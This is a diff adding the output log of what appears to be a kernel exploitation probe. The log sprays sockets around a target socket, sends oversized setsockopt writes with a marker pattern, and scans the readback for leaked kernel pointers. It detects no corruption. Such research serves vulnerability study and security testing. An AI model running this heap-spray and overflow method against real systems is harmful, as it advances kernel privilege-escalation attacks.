@@ -1,0 +1,49 @@
+=== PROBE 44c: SOCKOPT HEAP CORRUPTION TEST ===
+
+pid: 128
+
+=== A: SPRAY SOCKETS (pre-target) ===
+allocated 20 pre-spray sockets (fds 22-41)
+
+=== B: TARGET SOCKET ===
+target socket fd: 42
+
+=== C: SPRAY SOCKETS (post-target) ===
+allocated 20 post-spray sockets (fds 43-62)
+
+=== D: BASELINE STATE ===
+  fd=43: SO_SNDBUF=9216 (ret=0)
+  fd=44: SO_SNDBUF=9216 (ret=0)
+  fd=45: SO_SNDBUF=9216 (ret=0)
+  fd=46: SO_SNDBUF=9216 (ret=0)
+  fd=47: SO_SNDBUF=9216 (ret=0)
+
+=== E: OVERSIZED SETSOCKOPT ===
+pattern: 0xDEAD0000, 0xDEAD0001, 0xDEAD0002, ...
+  setsockopt(0x2000, len=64): ret=0
+  no corruption detected at size 64
+  setsockopt(0x2000, len=128): ret=0
+  no corruption detected at size 128
+  setsockopt(0x2000, len=256): ret=0
+  no corruption detected at size 256
+  setsockopt(0x2000, len=512): ret=0
+  no corruption detected at size 512
+  setsockopt(0x2000, len=1024): ret=0
+  no corruption detected at size 1024
+  setsockopt(0x2000, len=2048): ret=0
+  no corruption detected at size 2048
+  setsockopt(0x2000, len=4096): ret=0
+  no corruption detected at size 4096
+
+=== F: OTHER OPTIONS (SO_SNDBUF, SO_RCVBUF) ===
+SO_SNDBUF(len=2048): ret=-1
+SO_SNDBUF readback: ret=0 rlen=4 val=9216
+SO_RCVBUF(len=2048): ret=-1
+
+=== G: SCAN READBACK FOR KERNEL POINTERS ===
+getsockopt(0x2000, len=4096): ret=0 rlen=4
+
+=== H: CLEANUP ===
+sockets closed
+
+=== PROBE 44c COMPLETE ===
